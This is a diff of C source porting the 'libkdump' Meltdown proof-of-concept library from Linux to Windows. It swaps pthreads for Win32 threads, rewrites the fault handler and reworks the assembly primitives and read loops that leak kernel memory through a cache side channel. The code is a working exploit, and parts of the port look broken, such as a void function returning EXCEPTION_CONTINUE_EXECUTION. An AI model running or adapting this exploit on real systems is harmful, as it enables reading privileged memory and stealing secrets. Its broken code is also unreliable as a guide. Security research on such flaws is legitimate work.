@@ -3,7 +3,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <memory.h>
-#include <pthread.h>
+//#include <pthread.h>
 //#include <sched.h>
 #include <setjmp.h>
 #include <signal.h>
@@ -11,6 +11,7 @@
 #include <stdlib.h>
 //#include <unistd.h>
 #include <intrin.h>
+#include <windows.h>
 
 libkdump_config_t libkdump_auto_config = {0};
 
@@ -18,7 +19,7 @@ libkdump_config_t libkdump_auto_config = {0};
 static jmp_buf buf;
 
 static char *_mem = NULL, *mem = NULL;
-static pthread_t *load_thread;
+static HANDLE  *hThreadArray;
 static size_t phys = 0; //TODO: what is this???
 static int dbg = 0;
 
@@ -44,7 +45,7 @@ static libkdump_config_t config;
 // #ifdef __x86_64__
 
 // ---------------------------------------------------------------------------
-#define meltdown extern uint64_t meltdown(const uint8_t *phys, const uint64_t *mem)                                                              
+extern uint64_t meltdown(const uint8_t* phys, const uint64_t* mem);
   //asm volatile("1:\n"                                                          \
   //             "movq (%%rsi), %%rsi\n"                                         \ // reads 8 bytes at rsi (which is 0?)
   //             "movzx (%%rcx), %%rax\n"                                         \// zero-extends the byte at rcx(kernel address) into rax (temp storage)
@@ -56,9 +57,9 @@ static libkdump_config_t config;
   //             : "rax"); // clobbered register
 
 // ---------------------------------------------------------------------------
-#define meltdown_nonull extern uint64_t meltdown_nonull(const uint8_t *phys, const uint64_t *mem)                                                         \
-  //asm volatile("1:\n"                                                          \ //no rsi? TODO: why??
-  //             "movzx (%%rcx), %%rax\n"                                         \
+extern uint64_t meltdown_nonull(const uint8_t* phys, const uint64_t* mem);
+//asm volatile("1:\n"                                                          \ //no rsi? TODO: why??
+//             "movzx (%%rcx), %%rax\n"                                         \
   //             "shl $12, %%rax\n"                                              \
   //             "jz 1b\n"                                                       \
   //             "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
@@ -67,21 +68,17 @@ static libkdump_config_t config;
   //             : "rax");
 
 // ---------------------------------------------------------------------------
-#define meltdown_fast extern uint64_t meltdown_fast(const uint8_t *phys, const uint64_t *mem)                                                                \
-  //asm volatile("movzx (%%rcx), %%rax\n"                                         \ //no redo if theses zero
-  //             "shl $12, %%rax\n"                                              \
-  //             "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
-  //             :                                                               \
-  //             : "c"(phys), "b"(mem)                                           \
-  //             : "rax");
-
+extern uint64_t meltdown_fast(const uint8_t* phys, const uint64_t* mem); 
+ 
 
 #ifndef MELTDOWN
 #define MELTDOWN meltdown_nonull
 #endif
 
+#define MELTDOWN_FUNC(phys, mem) (MELTDOWN((phys), (mem)))
+
 // ---------------------------------------------------------------------------
-typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
+typedef enum { ERR, INFO, SUCCESS } d_sym_t;
 
 // ---------------------------------------------------------------------------
 static void debug(d_sym_t symbol, const char *fmt, ...) {
@@ -89,7 +86,7 @@ static void debug(d_sym_t symbol, const char *fmt, ...) {
     return;
 
   switch (symbol) {
-  case ERROR:
+  case ERR:
     printf("\x1b[31;1m[-]\x1b[0m ");
     break;
   case INFO:
@@ -310,19 +307,24 @@ static int check_config() {
 
 // ---------------------------------------------------------------------------
 //static void unblock_signal(int signum __attribute__((__unused__))) {
-static void unblock_signal(int signum) {
-  sigset_t sigs;
-  sigemptyset(&sigs);
-  sigaddset(&sigs, signum);
-  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+//static void unblock_signal(int signum) {
+//  sigset_t sigs;
+//  sigemptyset(&sigs);
+//  sigaddset(&sigs, signum);
+//  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+//}
+//
+//// ---------------------------------------------------------------------------
+//static void segfault_handler(int signum) {
+//  (void)signum;
+//  unblock_signal(SIGSEGV);
+//  longjmp(buf, 1);
+//}
+static void segfault_handler(int signum) {
+    (void)signum;
+    return EXCEPTION_CONTINUE_EXECUTION;
 }
 
-// ---------------------------------------------------------------------------
-static void segfault_handler(int signum) {
-  (void)signum;
-  unblock_signal(SIGSEGV);
-  longjmp(buf, 1);
-}
 
 // ---------------------------------------------------------------------------
 libkdump_config_t libkdump_get_autoconfig() {
@@ -354,8 +356,9 @@ int libkdump_init(const libkdump_config_t configuration) {
   for (j = 0; j < 256; j++) {
     flush(mem + j * 4096); //flush all 256 pages
   }
-
-  load_thread = malloc(sizeof(pthread_t) * config.load_threads);
+  //load_thread = malloc(sizeof(pthread_t) * config.load_threads);
+  DWORD   dwThreadId;
+  hThreadArray = malloc(sizeof(HANDLE) * config.load_threads);
   void *thread_func;
   switch (config.load_type) {
   case IO:
@@ -369,7 +372,7 @@ int libkdump_init(const libkdump_config_t configuration) {
     thread_func = nopthread;
   }
 
-  for (j = 0; j < config.load_threads; j++) {
+  /*for (j = 0; j < config.load_threads; j++) {
     int r = pthread_create(&load_thread[j], 0, thread_func, 0);
     if (r != 0) {
       int k;
@@ -381,12 +384,34 @@ int libkdump_init(const libkdump_config_t configuration) {
       errno = r;
       return -1;
     }
+  }*/
+
+  for (int i = 0; i < config.load_threads; i++)
+  {
+      hThreadArray[i] = CreateThread(
+          NULL,  
+          0,
+          thread_func,
+          NULL,          // argument to thread function 
+          0,                      // use default creation flags 
+          &dwThreadId);   // returns the thread identifier 
+
+      if (hThreadArray[i] == NULL)
+      {
+          for (int j = 0; j < i; j++)
+          {
+              TerminateThread(hThreadArray[j], 1);
+              CloseHandle(hThreadArray[j]);
+          }
+          return -1;
+      }
   }
+
   debug(SUCCESS, "Started %d load threads\n", config.load_threads);
 
   if (config.fault_handling == SIGNAL_HANDLER) {
     if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
-      debug(ERROR, "Failed to setup signal handler\n");
+      debug(ERR, "Failed to setup signal handler\n");
       libkdump_cleanup();
       return -1;
     }
@@ -403,9 +428,11 @@ int libkdump_cleanup() {
   }
 
   for (j = 0; j < config.load_threads; j++) {
-    pthread_cancel(load_thread[j]);
+    /*pthread_cancel(load_thread[j]);*/
+      TerminateThread(hThreadArray[j], 1);
+      CloseHandle(hThreadArray[j]);
   }
-  free(load_thread);
+  free(hThreadArray);
   free(_mem);
   debug(SUCCESS, "Everything is cleaned up, good bye!\n");
   return 0;
@@ -453,7 +480,7 @@ __declspec(noinline) int libkdump_read_tsx() { //read with tsx
 
   while (retries--) {
     if (xbegin() == _XBEGIN_STARTED) {
-      MELTDOWN;
+        MELTDOWN_FUNC(phys, mem);
       xend();
     }
     int i;
@@ -480,7 +507,7 @@ __declspec(noinline) int libkdump_read_signal_handler() {
 
   while (retries--) {
     if (!setjmp(buf)) {
-      MELTDOWN;
+        MELTDOWN_FUNC(phys, mem);
     }
 
     int i;
